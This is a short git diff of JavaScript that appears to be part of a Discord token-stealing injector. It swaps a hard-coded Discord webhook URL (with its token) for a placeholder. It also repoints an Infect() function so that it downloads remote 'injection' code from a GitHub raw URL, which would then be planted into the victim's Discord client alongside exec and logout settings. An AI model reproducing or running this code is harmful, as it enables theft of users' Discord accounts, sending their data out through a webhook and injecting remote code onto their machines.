@@ -6,7 +6,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://discord.com/api/webhooks/966633343141695538/ZzeJXm0leVrbh5vJ3Wx_b1G5yzcx2ZuhrX30HsYC9HXVoURLymn-FOE1vflo92dz9Har"
+const webhook = "da_webhook"
 
 const config = {
     "logout": "%LOGOUT%1",
@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://github.com/sehawq/sdlkajmsdopasjdo-sahdjaso-hqweo-rhno-hnaso-asd/blob/main/src/Injection/injection-clean', (resp) => {
+    https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
